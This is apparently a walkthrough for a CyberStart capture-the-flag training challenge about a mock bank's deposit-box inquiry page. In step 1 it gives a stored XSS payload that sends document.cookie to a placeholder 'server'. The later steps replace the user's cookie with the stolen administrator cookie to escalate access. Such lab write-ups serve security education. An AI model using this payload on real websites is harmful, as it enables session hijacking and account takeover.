# Unsafe Deposit Box
Agent 707, we've been working with the bank to try and make their website more secure, which will hopefully prevent the Bulldogs getting access.

As part of our penetration testing we've found a page which might be vulnerable to XSS. It's the page you use to request further information about safety deposit boxes. You need to be logged in as a standard bank customer to get to that page, but we think you can use XSS to change the access level to admin. Give it a try.

## Steps
1. Type in *\<script>window.location = "server" + document.cookie\</script>* in *Name* or *Phone* text box
    - Replace *server* with where it says after *Server started* on at the top

![console server](/assets/screenshots/hq-11-UnsafeDepositBox/step-1.png)

![XSS code](/assets/screenshots/hq-11-UnsafeDepositBox/step-2.png)
 
2. Click the Submit button
1. Copy the administrator cookie value that generates at the top and go into *Cookies* using *Inspect*
    - Inspect > Application > Cookies > https://play.cyberstart.com

![admin cookie](/assets/screenshots/hq-11-UnsafeDepositBox/step-3.png)

![application location](/assets/screenshots/hq-11-UnsafeDepositBox/step-4.png)

![cookie location](/assets/screenshots/hq-11-UnsafeDepositBox/step-5.png)

4. Replace the *depositUser* cookie value with the copied administrator cookie value

![replace depositUser cookie](/assets/screenshots/hq-11-UnsafeDepositBox/step-6.png)

5. Refresh the page